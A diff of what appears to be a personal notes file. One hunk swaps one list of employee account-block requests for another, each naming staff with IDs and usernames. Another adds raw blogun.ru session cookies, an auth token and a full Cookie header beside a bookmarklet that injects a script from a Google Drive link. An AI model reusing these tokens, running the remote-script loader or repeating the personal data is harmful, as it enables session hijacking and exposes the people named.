@@ -77,29 +77,21 @@ kagramanian.n
 
 
 
-Просьба заблокировать *18.01.2018* в 8:00 учетные записи:
-20011	Дяченко Дмитро Олександрович	diachenko.d1
-20024	Косяненко Владислав Анатолійович	kosianenko.v
-12009	Мальована Юлія Андріївна	skyrda.yu
-23020	Терлецька Анна Володимирівна	terletska.a
-14058	Лукін Олександр Валерійович	lukin.o
-06032	Іваницька Іванна Петрівна	ivanytska.i
-09047	Грецька Христина Андріївна	grecka.h
-10078	Карпухіна Марина Олександрівна	karpukhina.m
-10046	Тітіщенко Влада Олександрівна	titishchenko.v
-20052	Шкаріна Діна Миколаївна	agent.shkarina.d
-13016	Самойленко Наталія Володимирівна	agent.samoilenko.nv
-08047	Ошуєв Владислав Сергійович	oshuiev.v
-20042	Литвин Анна Миколаївна	agent.lytvyn.am1
-04091	Зіпа Таїсія Андріївна	zipa.t
-15001	Ісламова-Чегодарьова Севіндж Ісраілівна	islamova-chehodarova
-15052	Прищепа Юрій Андрійович	agent.pryshchepa.yua
-12004	Гончаренко Яна Олександрівна	goncharenko.yao
-10028	Коваленко Олександра Сергіївна	kovalenko.os6
-10202	Крештоп Юлія Олександрівна	kreshtop.yu
-10281	Лахай Вікторія Олександрівна	lakhai.v
-10156	Лисенко Артем Олександрович	lysenko.ao3
-10224	Явтушенко Тетяна Олексіївна	yavtushenko.t
+Просьба заблокировать *25.01.2018* в 8:00 учетные записи:
+12023	Бура Лілія Владиславівна	agent.bura.l
+11109	Дорош Вероніка Валеріївна	agent.dorosh.v
+11070	Савустьян Павло Сергійович	agent.savustian.p
+14143	Томащук Тетяна Юріївна 	tomashchuk.t
+10042	Левченко Юлія Юріївна	levchenko.y
+20007	Вернигор Ганна Вікторівна	vernyhor.h
+21009	Міськів Юлія Олександрівна	miskiv.yu
+26021	Власенко Олександр Валерійович	vlasenko.ov
+02077	Голуб Віктор Олександрович	agent.golub.vo
+00002	Купенко Наталія Василівна	kupenko.n
+
+
+
+
 
 
 
@@ -590,4 +582,42 @@ Bandisida к записи Как создается сайт
 
 avascript:(function(d, s) { s = d.createElement('script'); s.src = 'https://drive.google.com/uc?id=0B7vYOzzSvSkAaDBnSEwwNFl5c0k'; (d.head || d.documentElement).appendChild(s);})(document);
 
+**********************************************
+PHPSESSID=t6d7d8pjj45u6nbvkb0tviqiv5  t6d7d8pjj45u6nbvkb0tviqiv5
+	_ga=GA1.2.346602115.1516786915 GA1.2.346602115.1516786915
+	_gid=GA1.2.588286234.1516786915 GA1.2.588286234.1516786915
+	_ym_uid=1516786915239815901     1516786915239815901
+	_ym_isad=2                      2
+	unid=1262859617                 1262859617
+	lasturl=%2Fcpblogger.php        2Fcpblogger
+	isAdvertiser=0			0
+	_ym_visorc_7262719=w           w
+*************************************************
+PHPSESSID=t6d7d8pjj45u6nbvkb0tviqiv5  
+	_ga=GA1.2.346602115.1516786915
+	_gid=GA1.2.588286234.1516786915
+	_ym_uid=1516786915239815901
+	_ym_isad=2
+	unid=1262859617
+	lasturl=%2Fcpblogger.php
+	isAdvertiser=0
+	_ym_visorc_7262719=w
+	_gat=1
+*********************************************
+t6d7d8pjj45u6nbvkb0tviqiv5
+GA1.2.346602115.1516786915
+GA1.2.588286234.1516786915
+1516786915239815901
+w
+330494d5715fca76498d33bf263fef5467527673ef869a5382099fa4db97c4a1
+277364
+
+Host: blogun.ru
+Connection: keep-alive
+Cache-Control: max-age=0
+
+Upgrade-Insecure-Requests: 1
+
+
+Cookie: PHPSESSID=t6d7d8pjj45u6nbvkb0tviqiv5; _ga=GA1.2.346602115.1516786915; _gid=GA1.2.588286234.1516786915; _ym_uid=1516786915239815901; _ym_isad=2; unid=1262859617; isAdvertiser=0; id=277364; auth=81ae37fea2fb01845ff0caf16a1110041e911c8c84f06a96760cf416a3e78bae; __utmc=259236953; __utmz=259236953.1516792059.1.1.utmcsr=wiki.blogun.ru|utmccn=(referral)|utmcmd=referral|utmcct=/%D0%9A%D0%B0%D0%BA_%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B8%D1%82%D1%8C_API%3F; forceVersion=regular; __utma=259236953.346602115.1516786915.1516792059.1516795794.2; lasturl=%2Fgetcode.php%3Fid%3D397467%26idblog%3D355268%26submenu%3D2%26menu%3Dtsk
 
